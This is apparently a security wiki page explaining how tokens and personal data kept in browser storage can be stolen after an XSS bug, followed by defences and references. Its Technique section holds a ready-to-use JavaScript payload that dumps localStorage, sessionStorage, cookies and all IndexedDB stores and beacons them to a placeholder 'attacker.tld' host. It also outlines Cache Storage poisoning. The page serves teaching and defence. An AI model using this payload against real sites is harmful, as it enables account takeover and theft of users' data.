---
title: Client-side storage abuse
slug: client-side-storage-attacks
---

> **TL;DR:** Tokens, PII, and even crypto keys live in localStorage / sessionStorage / IndexedDB / Cache Storage — any XSS or same-origin gadget reads them, and Service Worker caches persist after logout.

## What it is
Browsers expose several origin-scoped persistent stores: `localStorage` (synchronous string KV, no expiry), `sessionStorage` (per-tab), `IndexedDB` (async structured object DB), Cache Storage (Service Worker `caches.*`), and Cookie Store. None of these are protected from JavaScript running in the same origin — there is no `HttpOnly` for them. Developers misuse them as "session storage" for JWTs, refresh tokens, and OAuth state, turning every reflected/stored/DOM XSS into total account compromise.

## Preconditions / where it applies
- SPA (React/Vue/Angular/Next) that authenticates by storing a bearer/JWT in `localStorage`.
- An XSS sink anywhere on the same origin (even a subdomain if cookies/state are scoped wider).
- Mobile/Electron wrappers using a WebView that shares storage with the embedded site.

## Technique
After landing XSS, exfiltrate every store in one shot:

```js
const dump = {
  ls: { ...localStorage },
  ss: { ...sessionStorage },
  ck: document.cookie,
};
const dbs = await indexedDB.databases();
dump.idb = {};
for (const { name } of dbs) {
  const db = await new Promise(r => { const o = indexedDB.open(name); o.onsuccess = () => r(o.result); });
  for (const store of db.objectStoreNames) {
    const tx = db.transaction(store).objectStore(store);
    dump.idb[`${name}.${store}`] = await new Promise(r => { const o = tx.getAll(); o.onsuccess = () => r(o.result); });
  }
}
navigator.sendBeacon('https://attacker.tld/c', JSON.stringify(dump));
```

Other primitives:

- **Cache Storage poisoning** — write a malicious `index.html` into `caches.open('v1')` then unregister no one; the next navigation served from a Service Worker hits attacker content. See [[service-worker-persistent-xss]].
- **Origin pollution via subdomain** — `auth.target.com` and `app.target.com` share `localStorage` only if explicitly bridged via postMessage, but cookies with `Domain=.target.com` and shared origins via document.domain do leak.
- **WebSQL / FileSystem API** legacy stores still exist in some embedded browsers.
- **CryptoKey extraction** — non-extractable `CryptoKey` objects survive XSS but a wrapping key stored as raw bytes in IndexedDB does not.

A subtle issue: SameSite=Lax cookies + bearer-token-in-localStorage doubles the attack surface. The cookie blocks CSRF, but XSS exfil of the bearer is trivial.

## Detection and defence
- Default to `Secure; HttpOnly; SameSite=Strict` cookies for session material; bearer tokens in headers only for cross-origin APIs that genuinely need them.
- If tokens must live client-side, store them in memory only (closure) and refresh via silent iframe or refresh-token cookie.
- Subresource Integrity + strict CSP with `script-src 'self' 'strict-dynamic'` and no `'unsafe-eval'` to raise the XSS bar.
- Trusted Types ([[trusted-types-bypass]]) blocks the common `innerHTML` sinks that feed storage exfil.
- Audit IndexedDB and Cache Storage on logout — call `caches.keys().then(k => k.forEach(caches.delete))` and `indexedDB.databases().then(...)`.

## References
- [MDN – Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API) — semantics and pitfalls
- [OWASP – HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html) — storage rules
- [Auth0 – Token Storage](https://auth0.com/docs/secure/security-guidance/data-security/token-storage) — why localStorage is a bad idea
